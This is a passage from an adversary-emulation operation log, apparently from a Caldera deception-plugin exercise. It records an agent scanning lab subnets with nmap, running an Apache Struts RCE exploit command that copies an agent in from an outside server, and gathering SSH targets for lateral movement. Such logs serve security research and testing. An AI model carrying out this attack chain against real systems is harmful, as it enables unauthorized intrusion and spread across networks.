"host.subnet.ipaddrs", "value": "192.168.201.0/24", "created": "2024-04-26T23:40:02Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["8820d7db-0ef2-44ef-8197-501e8ee3c43b", "e07921d6-b9e1-4277-a4d0-c12a3109baa4", "26f46d4f-0c48-4952-99b4-e4a3766799fb", "e9bb737a-d6f7-43ce-a28f-c824629a61a9", "34eeee8c-eb81-48c0-8e26-c4c4a97e4f3f", "27cfc0cb-e7a4-4693-b6d3-fd1cf6d43abb", "9511e310-83f1-4fdd-a60e-24b1d7b4c545", "67271bd6-f418-4a31-8ac9-adfbbf7e97f4"], "relationships": ["host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs([])", "host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.3', '192.168.201.4', '192.168.201.5', '192.168.201.6', '192.168.201.82', '192.168.201.90'])", "host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.2', '192.168.201.3', '192.168.201.4', '192.168.201.5', '192.168.201.6', '192.168.201.82', '192.168.201.90'])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.006"}, {"unique": "host.subnet.online_ipaddrs['192.168.201.3', '192.168.201.4', '192.168.201.5', '192.168.201.6', '192.168.201.82', '192.168.201.90']", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": ["192.168.201.3", "192.168.201.4", "192.168.201.5", "192.168.201.6", "192.168.201.82", "192.168.201.90"], "created": "2024-04-26T23:41:36Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["e07921d6-b9e1-4277-a4d0-c12a3109baa4", "26f46d4f-0c48-4952-99b4-e4a3766799fb", "e9bb737a-d6f7-43ce-a28f-c824629a61a9"], "relationships": ["host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.3', '192.168.201.4', '192.168.201.5', '192.168.201.6', '192.168.201.82', '192.168.201.90'])"], "limit_count": -1, "collected_by": ["czljvk", "cxfxwj", "dagwxr"], "technique_id": "T1021.006"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4665330>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7f5cf46481c0>", "source": {"unique": "host.subnet.ipaddrs192.168.201.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.201.0/24", "created": "2024-04-26T23:43:06Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_online_ipaddrs", "target": {"unique": "host.subnet.online_ipaddrs['192.168.201.3', '192.168.201.4', '192.168.201.5', '192.168.201.6', '192.168.201.82', '192.168.201.90']", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": ["192.168.201.3", "192.168.201.4", "192.168.201.5", "192.168.201.6", "192.168.201.82", "192.168.201.90"], "created": "2024-04-26T23:43:06Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "scan.subnet.addr192.168.201.0/24", "trait": "scan.subnet.addr", "name": "scan.subnet.addr", "value": "192.168.201.0/24", "created": "2024-04-26T23:43:01Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "26f46d4f-0c48-4952-99b4-e4a3766799fb", "collect": "2024-04-26T23:43:03Z", "finish": "2024-04-26T23:43:06Z", "ability": {"ability_id": "deception-nmapsubnet", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "executors": [{"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "webserver-a", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:43:03Z"}, {"id": "007336c1-5bd0-4984-8a61-e7ccc05b3401", "paw": "cxfxwj", "command": "nmap -sV --version-light -oX - 192.168.202.3", "plaintext_command": "nmap -sV --version-light -oX - 192.168.202.3", "status": 0, "score": 1, "decide": "2024-04-26T23:43:11Z", "pin": 0, "pid": "2038", "facts": [{"unique": "host.remote.ip192.168.202.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.202.3", "created": "2024-04-26T23:43:16Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["007336c1-5bd0-4984-8a61-e7ccc05b3401"], "relationships": ["host.remote.ip(192.168.202.3) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.202.3) : has_port_services : host.remote.port_services([('22', 'ssh')])"], "limit_count": -1, "collected_by": ["cxfxwj"], "technique_id": "T1021.004"}, {"unique": "host.remote.ports['22']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22"], "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["2b1fabfa-9182-4ea9-a36f-292c66f135c5", "007336c1-5bd0-4984-8a61-e7ccc05b3401", "de63325b-25ae-453b-84d1-860a8e4f7eef", "7e5ca019-19a9-4aae-986e-8aed3805f52a"], "relationships": ["host.remote.ip(192.168.201.3) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.201.4) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.201.5) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.201.6) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.202.3) : has_open_ports : host.remote.ports(['22'])"], "limit_count": -1, "collected_by": ["czljvk", "cxfxwj", "dagwxr", "etrrtg"], "technique_id": "T1021.004"}, {"unique": "host.remote.port_services[('22', 'ssh')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"]], "created": "2024-04-26T23:42:13Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["2b1fabfa-9182-4ea9-a36f-292c66f135c5", "007336c1-5bd0-4984-8a61-e7ccc05b3401", "de63325b-25ae-453b-84d1-860a8e4f7eef", "7e5ca019-19a9-4aae-986e-8aed3805f52a"], "relationships": ["host.remote.ip(192.168.201.3) : has_port_services : host.remote.port_services([('22', 'ssh')])", "host.remote.ip(192.168.201.4) : has_port_services : host.remote.port_services([('22', 'ssh')])", "host.remote.ip(192.168.201.5) : has_port_services : host.remote.port_services([('22', 'ssh')])", "host.remote.ip(192.168.201.6) : has_port_services : host.remote.port_services([('22', 'ssh')])", "host.remote.ip(192.168.202.3) : has_port_services : host.remote.port_services([('22', 'ssh')])"], "limit_count": -1, "collected_by": ["czljvk", "cxfxwj", "dagwxr", "etrrtg"], "technique_id": "T1021.004"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf46665f0>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf46655a0>", "source": {"unique": "host.remote.ip192.168.202.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.202.3", "created": "2024-04-26T23:43:16Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22"], "created": "2024-04-26T23:43:16Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4649ed0>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4648a30>", "source": {"unique": "host.remote.ip192.168.202.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.202.3", "created": "2024-04-26T23:43:16Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"]], "created": "2024-04-26T23:43:16Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "scan.remote.addr192.168.202.3", "trait": "scan.remote.addr", "name": "scan.remote.addr", "value": "192.168.202.3", "created": "2024-04-26T23:43:11Z", "score": 3, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "007336c1-5bd0-4984-8a61-e7ccc05b3401", "collect": "2024-04-26T23:43:15Z", "finish": "2024-04-26T23:43:16Z", "ability": {"ability_id": "deception-nmap", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.004", "name": "Deception Nmap Host", "description": "Scans a host for open ports", "executors": [{"name": "sh", "platform": "linux", "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"source": "host.remote.ip", "edge": "has_open_ports", "target": "host.remote.ports", "custom_parser_vals": {}}, {"source": "host.remote.ip", "edge": "has_port_services", "target": "host.remote.port_services", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"source": "host.remote.ip", "edge": "has_open_ports", "target": "host.remote.ports", "custom_parser_vals": {}}, {"source": "host.remote.ip", "edge": "has_port_services", "target": "host.remote.port_services", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "webserver-a", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:43:15Z"}, {"id": "e2a60de4-663d-4dad-b657-af3daac84a15", "paw": "cxfxwj", "command": "nmap -sV --version-light -oX - 192.168.200.2,3,4,5", "plaintext_command": "nmap -sV --version-light -oX - 192.168.200.2,3,4,5", "status": 0, "score": 1, "decide": "2024-04-26T23:43:21Z", "pin": 0, "pid": "2042", "facts": [{"unique": "host.remote.ip192.168.200.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.3", "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}, {"unique": "host.remote.ports['22', '8080']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22", "8080"], "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "2b1fabfa-9182-4ea9-a36f-292c66f135c5", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "7e5ca019-19a9-4aae-986e-8aed3805f52a", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.4) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.201.82) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.201.90) : has_open_ports : host.remote.ports(['22', '8080'])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}, {"unique": "host.remote.ip192.168.200.4", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.4", "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.4) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.4) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}, {"unique": "host.remote.ip192.168.200.5", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.5", "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}, {"unique": "host.remote.port_services[('22', 'ssh'), ('8080', 'http')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"], ["8080", "http"]], "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "2b1fabfa-9182-4ea9-a36f-292c66f135c5", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "7e5ca019-19a9-4aae-986e-8aed3805f52a", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.200.4) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.201.82) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.201.90) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4c94130>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4800820>", "source": {"unique": "host.remote.ip192.168.200.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.3", "created": "2024-04-26T23:43:31Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22', '8080']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22", "8080"], "created": "2024-04-26T23:43:31Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4802320>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4801600>", "source": {"unique": "host.remote.ip192.168.200.4", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.4", "created": "2024-04-26T23:43:31Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22', '8080']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22", "8080"], "created": "2024-04-26T23:43:31Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf49a76d0>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf49a6dd0>", "source": {"unique": "host.remote.ip192.168.200.5", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.5", "created": "2024-04-26T23:43:31Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22', '8080']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22", "8080"], "created": "2024-04-26T23:43:31Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf49a5ab0>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf49a50f0>", "source": {"unique": "host.remote.ip192.168.200.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.3", "created": "2024-04-26T23:43:31Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh'), ('8080', 'http')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"], ["8080", "http"]], "created": "2024-04-26T23:43:31Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4775e40>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4777100>", "source": {"unique": "host.remote.ip192.168.200.4", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.4", "created": "2024-04-26T23:43:31Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh'), ('8080', 'http')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"], ["8080", "http"]], "created": "2024-04-26T23:43:31Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4776050>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf47757b0>", "source": {"unique": "host.remote.ip192.168.200.5", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.5", "created": "2024-04-26T23:43:31Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh'), ('8080', 'http')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"], ["8080", "http"]], "created": "2024-04-26T23:43:31Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "scan.remote.addr192.168.200.2,3,4,5", "trait": "scan.remote.addr", "name": "scan.remote.addr", "value": "192.168.200.2,3,4,5", "created": "2024-04-26T23:43:21Z", "score": 7, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "e2a60de4-663d-4dad-b657-af3daac84a15", "collect": "2024-04-26T23:43:24Z", "finish": "2024-04-26T23:43:31Z", "ability": {"ability_id": "deception-nmap", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.004", "name": "Deception Nmap Host", "description": "Scans a host for open ports", "executors": [{"name": "sh", "platform": "linux", "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"source": "host.remote.ip", "edge": "has_open_ports", "target": "host.remote.ports", "custom_parser_vals": {}}, {"source": "host.remote.ip", "edge": "has_port_services", "target": "host.remote.port_services", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"source": "host.remote.ip", "edge": "has_open_ports", "target": "host.remote.ports", "custom_parser_vals": {}}, {"source": "host.remote.ip", "edge": "has_port_services", "target": "host.remote.port_services", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "webserver-a", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:43:24Z"}, {"id": "29826beb-30c8-4537-866a-91ca58e9bf1c", "paw": "rezmky", "command": "python3 strutsExploit.py 192.168.200.5:8080 http://10.20.20.1:8888", "plaintext_command": "python3 strutsExploit.py 192.168.200.5:8080 http://10.20.20.1:8888", "status": 0, "score": 3, "decide": "2024-04-26T23:43:36Z", "pin": 0, "pid": "1778", "facts": [], "relationships": [], "used": [{"unique": "host.lateralMove.ip192.168.200.5", "trait": "host.lateralMove.ip", "name": "host.lateralMove.ip", "value": "192.168.200.5", "created": "2024-04-26T23:43:36Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": ["rezmky"], "technique_id": null}, {"unique": "host.lateralMove.port8080", "trait": "host.lateralMove.port", "name": "host.lateralMove.port", "value": 8080, "created": "2024-04-26T23:43:36Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": ["rezmky"], "technique_id": null}], "unique": "29826beb-30c8-4537-866a-91ca58e9bf1c", "collect": "2024-04-26T23:43:38Z", "finish": "2024-04-26T23:43:41Z", "ability": {"ability_id": "deception-struts", "tactic": "deception-lateral-movement", "technique_name": "Struts", "technique_id": "T9061", "name": "Exploit Apache Struts RCE", "description": "Copies agent to target using Apache Struts RCE", "executors": [{"name": "sh", "platform": "linux", "command": "python3 strutsExploit.py #{host.lateralMove.ip}:#{host.lateralMove.port} #{server}", "code": null, "language": null, "build_target": null, "payloads": ["strutsExploit.py"], "uploads": [], "timeout": 30, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-lateral-movement"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "python3 strutsExploit.py #{host.lateralMove.ip}:#{host.lateralMove.port} #{server}", "code": null, "language": null, "build_target": null, "payloads": ["strutsExploit.py"], "uploads": [], "timeout": 30, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "attacker", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:43:38Z"}, {"id": "f4eac7ba-a67f-4f2f-a62a-a45c83115929", "paw": "dagwxr", "command": "pip3 install pyopenssl --upgrade; pip3 install stormssh; ~/.local/bin/storm list", "plaintext_command": "pip3 install pyopenssl --upgrade; pip3 install stormssh; ~/.local/bin/storm list", "status": 0, "score": 0, "decide": "2024-04-26T23:43:41Z", "pin": 0, "pid": "1472", "facts": [{"unique": "remote.ssh.cmddatabaseA@192.168.201.5:22", "trait": "remote.ssh.cmd", "name": "remote.ssh.cmd", "value": "databaseA@192.168.201.5:22", "created": "2024-04-26T23:43:50Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["f4eac7ba-a67f-4f2f-a62a-a45c83115929"], "relationships": ["remote.ssh.cmd(databaseA@192.168.201.5:22)"], "limit_count": -1, "collected_by": ["dagwxr"], "technique_id": "T1021.006"}, {"unique": "remote.ssh.cmddatabaseB@192.168.201.6:22", "trait": "remote.ssh.cmd", "name": "remote.ssh.cmd", "value": 